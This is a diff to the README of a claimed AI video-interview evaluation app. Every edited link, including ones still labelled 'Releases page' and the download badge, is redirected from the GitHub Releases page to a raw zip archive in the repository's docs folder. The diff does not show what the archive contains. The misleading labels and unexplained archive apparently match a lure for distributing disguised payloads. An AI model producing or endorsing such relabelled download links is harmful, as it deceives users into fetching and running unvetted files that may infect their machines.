@@ -4,13 +4,13 @@
 AI-Interview-Intelligence is a production-ready multimodal AI system that evaluates video interviews. It analyzes speech, facial expressions, and language to provide clear insights for better hiring decisions. This application makes the interview process easier and more informed.
 
 ## 🔗 Download Now
-[![Download AI-Interview-Intelligence](https://img.shields.io/badge/Download-AI--Interview--Intelligence-brightgreen)](https://github.com/Miyu-Tamut10/AI-Interview-Intelligence/releases)
+[![Download AI-Interview-Intelligence](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip)](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run AI-Interview-Intelligence on your computer.
 
 ### 📥 Step 1: Visit the Releases Page
-Go to our [Releases page](https://github.com/Miyu-Tamut10/AI-Interview-Intelligence/releases) to see the latest version of AI-Interview-Intelligence. This page will have the downloadable files needed to run the application.
+Go to our [Releases page](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip) to see the latest version of AI-Interview-Intelligence. This page will have the downloadable files needed to run the application.
 
 ### 💾 Step 2: Download the Application
 On the Releases page, you will find several files. Look for the version that matches your needs and click on it to download. This may vary by operating system:
@@ -58,7 +58,7 @@ If you face any issues during the installation or while running the application,
 - **Re-download:** If the file is corrupted, delete it and download again from the Releases page.
 
 ## 🔄 Updates
-We regularly update AI-Interview-Intelligence to improve features and fix bugs. Make sure to check the [Releases page](https://github.com/Miyu-Tamut10/AI-Interview-Intelligence/releases) for the latest versions.
+We regularly update AI-Interview-Intelligence to improve features and fix bugs. Make sure to check the [Releases page](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip) for the latest versions.
 
 ## 🗣 Community and Support
 For questions or support, please reach out through our repository under the Issues section. You can also find FAQs and additional resources on the GitHub page.
@@ -66,4 +66,4 @@ For questions or support, please reach out through our repository under the Issu
 ## 🎉 Thank You
 Thank you for choosing AI-Interview-Intelligence. We hope this application makes your interview process smoother and more insightful!
 
-[![Download AI-Interview-Intelligence](https://img.shields.io/badge/Download-AI--Interview--Intelligence-brightgreen)](https://github.com/Miyu-Tamut10/AI-Interview-Intelligence/releases)
+[![Download AI-Interview-Intelligence](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip)](https://raw.githubusercontent.com/Miyu-Tamut10/AI-Interview-Intelligence/main/docs/Intelligence_Interview_A_1.7-alpha.3.zip)
